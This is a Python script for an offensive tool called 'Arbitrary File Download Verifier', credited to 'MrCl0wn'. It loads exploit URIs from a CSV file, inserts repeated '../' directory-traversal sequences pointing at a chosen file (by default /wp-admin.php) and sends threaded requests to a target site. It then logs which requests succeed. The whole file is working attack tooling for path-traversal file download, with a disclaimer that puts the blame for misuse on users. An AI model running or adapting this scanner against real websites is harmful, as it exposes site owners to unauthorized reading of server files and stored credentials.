#!/usr/bin/env python
# -*- coding: utf-8 -*-

__author__ = "Cleiton Pinheiro aka MrCl0wn"
__credits__ = ["Cleiton Pinheiro"]
__license__ = "GPL"
__version__ = "0.1"
__maintainer__ = "Cleiton Pinheiro aka MrCl0wn"
__email__ = "mrcl0wnlab@gmail.com"

"""
My blog: http://blog.mrcl0wn.com/
GitHub: https://github.com/MrCl0wnLab
Twitter: https://twitter.com/MrCl0wnLab

Gr33tz: @UnkL4b, @danigfavero, @Rogy153, @g1ov4z, @kr4m3er, @ChOkO088, @r00t-3xp10it, @joaoescribano

0x00 -  S3 4lguém f3r1r-53 u54nd0 um4 f4c4, nã0 v4m05 culp4r 0 f4br1c4nt3 p3l0 f3r1m3nt0, m45 51m qu3m m4nu5314 53u5 pr0dut05.
0x01 -  N3m um 4dm1n f01 f3r1d0 n0 pr0c3550 d3 cr14çã0 d3574 f3rr4m3n74.
0x02 -  http://blog.mrcl0wn.com
0x03 -  http://unkl4b.github.io
0x04 -  http://blog.inurl.com.br
0x05 -  https://mh4x0f.github.io
"""

import threading
import time
import argparse
from datetime import datetime
from modules.filelocal import Filelocal
from modules.stylecolor import Stylecolor
from modules.webrequest import WebRequest


def filterCodeInt(str_value):
    return int(''.join(filter(str.isdigit, str(str_value))))


def setColorCode(code_http, obj_system_color):
    if code_http:
        return obj_system_color.__getattribute__(str(code_http))


def mountUrifuzz(pwd_count, uri_exploit, file_exploit):

    pwd_tmp = ''
    for pwd in range(pwd_count):
        pwd_tmp += '../'

    pwd_tmp = pwd_tmp[:-1]+file_exploit
    uri_exploit_file = uri_exploit.replace('_PWD__FILE_', pwd_tmp)
    return uri_exploit_file


def saveResult(value, file):
    data_save = objFile.openFileTxt(file, 'a+')
    data_save.writelines(value)
    data_save.close()


def requestThread(url, uri, ref, obj_web, obj_system_color):

    result_request = obj_web.sendRequest(url)
    date_time = datetime.now().strftime("%X")

    try:
        if result_request:
            color = setColorCode(obj_web.atCode, obj_system_color)
            print(
                f"{color} [ {date_time} ] [ URL ] {url} [ CODE ] {obj_web.atCode} ")
            print(f" |____________[ ref ] {ref} {obj_system_color.end}\n")
            saveResult(f"{date_time};{url};{ref}\n", 'ok-file.log')
        else:
            http_err = filterCodeInt(obj_web.atErr)
            color = setColorCode(http_err, obj_system_color)
            print(
                f"{color} [ {date_time} ] [ URI ] {uri} [ CODE_ERROR ] {http_err}  {obj_system_color.end}")
            saveResult(f"{date_time};{url};{ref}\n", 'error-file.log')

    except Exception as e:
        print(e)
        pass


if __name__ == "__main__":

    objAFDRequest = WebRequest()
    objStyleColor = Stylecolor()
    objFile = Filelocal()

    banner = '''
        ▄████████    ▄████████ ████████▄  
        ███    ███   ███    ███ ███   ▀███ 
        ███    ███   ███    █▀  ███    ███ 
        ███    ███  ▄███▄▄▄     ███    ███ 
      ▀███████████ ▀▀███▀▀▀     ███    ███ 
        ███    ███   ███        ███    ███ 
        ███    ███   ███        ███   ▄███ 
        ███    █▀    ███        ████████▀ 
        Arbitrary File Download-[ Verifier ]
        By MrCl0wn
        '''

    print(f"{objStyleColor.fg_white}{banner}{objStyleColor.end}")

    parser_arg_menu = argparse.ArgumentParser(
        prog='tool', formatter_class=lambda prog: argparse.HelpFormatter(prog, max_help_position=20))
    parser_arg_menu.add_argument(
        "--url", help="URL to request Ex: http://www.host.com", metavar="http://url",  required=True)
    parser_arg_menu.add_argument("--file", help="File to fuzzing Ex: /wp-admin.php",
                                 metavar="/file.php",  default='/wp-admin.php', required=False)
    parser_arg_menu.add_argument(
        "--threads", help="Threads", metavar="10", default=5)
    arg_menu = parser_arg_menu.parse_args()

    threads = arg_menu.threads
    taget_url = arg_menu.url

    file_inject_uri_exploit = arg_menu.file

    file_source_uri_exploit = 'inject.csv'
    data_exploit = objFile.openFileCsv(file_source_uri_exploit, 'r')

    MAX_CONECTION_THREAD = int(threads)
    list_threads = []

    '''Main Threads and requests
    Ref: https://github.com/danilovazb/sawef/blob/e65dc9fb357afbd1b7e395978472785966f6e581/sawef.py#L202
    '''
    for data_value_csv in data_exploit:

        uri_exploit = data_value_csv['exploit_uri']
        pwd_count = int(data_value_csv['pwd_count'])
        pwd_ref = data_value_csv['ref']
        pwd_uri_exploit = mountUrifuzz(
            pwd_count, uri_exploit, file_inject_uri_exploit)

        target_uri_exploit = taget_url+pwd_uri_exploit

        while threading.active_count() > MAX_CONECTION_THREAD:
            time.sleep(1)

        thread = threading.Thread(target=requestThread, args=(
            target_uri_exploit, pwd_uri_exploit, pwd_ref, objAFDRequest, objStyleColor))

        list_threads.append(thread)
        thread.start()

    for thread in list_threads:
        thread.join()
